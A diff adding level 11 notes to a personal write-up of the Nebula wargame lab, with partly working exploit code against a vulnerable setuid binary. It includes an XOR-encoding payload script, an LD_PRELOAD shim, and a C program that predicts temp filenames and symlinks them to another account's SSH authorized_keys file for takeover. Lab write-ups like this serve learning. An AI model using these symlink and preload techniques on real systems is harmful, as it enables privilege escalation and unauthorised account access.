@@ -109,11 +109,10 @@ level08@nebula:~$ su - flag08
 Password: 
 flag08@nebula:~$ getflag 
 You have successfully executed getflag on a target account
-flag08@nebula:~$ 
 ```
 
 ## 09
-I skipped this one, after some initial investigations
+I skipped this one, after some initial investigations as PHP's not really my thing ATM.
 
 ## 10
 This one's a "time-of-use to time-of-check" vulnerability and relies on swapping the target between the access check and the open calls.
@@ -147,10 +146,115 @@ dummy
 ...
 ```
 
-## nn
-```console
+## 11
+Two approaches here, but neither are 100%, although I think they're part of the way...
 
+1. Python to encrypt the cmd & provide it as input
+```python
+string = "/bin/getflag\x00"
+key = 0
+ 
+enc_string = ""
+ 
+for char in string:
+    enc_char = ord(char) ^ key & 0xff
+    enc_string += chr(enc_char)
+    key = key - ord(char) & 0xff
+ 
+print "Content-Length: 1024\n" + enc_string + "\x00" * (1024 - len(enc_string))
 ```
+then run as below
+```console
+level11@nebula:~$ python level11.py | ../flag11/flag11
+blue = 1024, length = 1024, pink = 1024
+getflag is executing on a non-flag account, this doesn't count
+```
+
+2. LD_PRELOAD to hijack a few routines...
+```c
+// Take control of random
+int random(){
+   return 0;
+}
+
+// Stop the file being deleted
+int unlink(const char *pathname) {
+   return 0;
+}
+
+// Take control of the reported PID
+int getpid() {
+   return 1;
+}
+```
+build via `gcc --shared -fPIC level11b.c -o level11b.o` then use via `python level11.py LD_PRELOAD=$PWD/level11b.o ../flag11/flag11`.
+Also do `export TEMP=/tmp`
+
+If working, should see `/tmp/1.A0aA0a` be created and filled with the Python payload.
+
+Generate an SSH key via `echo -e "/tmp/level11.key" | ssh-keygen -t rsa -b 2048 -C "level11@nebula"` then use the pubkey in a Python script such as
+```python
+#!/usr/bin/env python
+
+command = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDqcnvJfk6hxg1U3fSk8x2BOJhV85tmOBAJ3cq1coggJaSKNlaJYnfY7Kyc/Sxhi7KDZYv1CXMRefD4nboQbMteRZouRoE3w11tT38scb5tkrXrZll
+cHFMG1v/3MPFYYoG2lx8XXsRmSqYJoEk4Q46MiWPvn6b5Cyr6+VUNeV5uck/RIKuUG76uqqjH9/QRUZ9CATjFbDJoY6nXZFVJh4/az7++8wR1kw1Y6Vbs3enLaIWZup2wx89RSenW6N3aszwCwH7QlLhca/qVP7EGF
+fUZD3S+zfxbSUb3LO+eBmA3/iMbzvFdFhF1jVDtu4QFzmu77ZZ8JGlHLi4IfNLkp4BX level11@nebula\x00"
+length = 1024
+
+print "Content-Length: " + str(length) + "\n" + command + '\x00' + "A"*(length - len(command))
+```
+and that should write the key to the temp file. The theory is that you should be able to link `/tmp/1.A0aA0a` to `/home/flag11/.ssh/authorized_keys` such that the ../flag11/flag11 writes the ssh key into the auth keys file, but as yet I've not got that working...  I need to check, but I suspect that the LD_PRELOAD only works if the programs run under strace, but when under strace, the setuid doesn't work, so it can't write to the authkey file...
+
+3. Combine writing the SSH key with 'guessing' the random values.  Attacker program 
+```c
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/types.h>
+#include <fcntl.h>
+#include <stdio.h>
+#include <sys/mman.h>
+
+int getrand(char **path, int pid, int time)
+{
+  char *tmp;
+  int fd =  0;
+
+  srandom(time);
+
+  tmp = getenv("TEMP");
+  asprintf(path, "%s/%d.%c%c%c%c%c%c", tmp, pid,
+      'A' + (random() % 26), '0' + (random() % 10),
+      'a' + (random() % 26), 'A' + (random() % 26),
+      '0' + (random() % 10), 'a' + (random() % 26));
+
+
+  return fd;
+}
+
+#define CL "Content-Length: "
+
+int main(int argc, char **argv)
+{
+  char line[256];
+  char buf[2048] = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDqcnvJfk6hxg1U3fSk8x2BOJhV85tmOBAJ3cq1coggJaSKNlaJYnfY7Kyc/Sxhi7KDZYv1CXMRefD4nboQbMteRZouRoE3w11tT38scb
+5tkrXrZllcHFMG1v/3MPFYYoG2lx8XXsRmSqYJoEk4Q46MiWPvn6b5Cyr6+VUNeV5uck/RIKuUG76uqqjH9/QRUZ9CATjFbDJoY6nXZFVJh4/az7++8wR1kw1Y6Vbs3enLaIWZup2wx89RSenW6N3aszwCwH7QlLhc
+a/qVP7EGFfUZD3S+zfxbSUb3LO+eBmA3/iMbzvFdFhF1jVDtu4QFzmu77ZZ8JGlHLi4IfNLkp4BX level11@nebula";
+  int pid;
+  int fd;
+  char *path;
+  FILE* stream;
+
+  pid = getpid()+1;
+  getrand(&path, pid, time(NULL));
+  symlink("/home/flag11/.ssh/authorized_keys",path);
+  getrand(&path, pid, time(NULL)+1);
+  symlink("/home/flag11/.ssh/authorized_keys",path);
+  fprintf(stdout, "%s%d\n%s",CL,sizeof(buf),buf);
+}
+```
+is compiled via `gcc -o level11c level11c.c` then run via `./level11c | ../flag11/flag11`.  
+It sets up a couple of links to the authkeys file, by guessing the pid to be the next sequential one, then trying the file name generation with the current second and the next second as starter values.  The flag program writes to one of them (hopefully) which means that the attacker can then access the account using the private key they earlier generated: `ssh -i /tmp/level11.key flag11@127.0.0.1`
 
 ## nn
 ```console
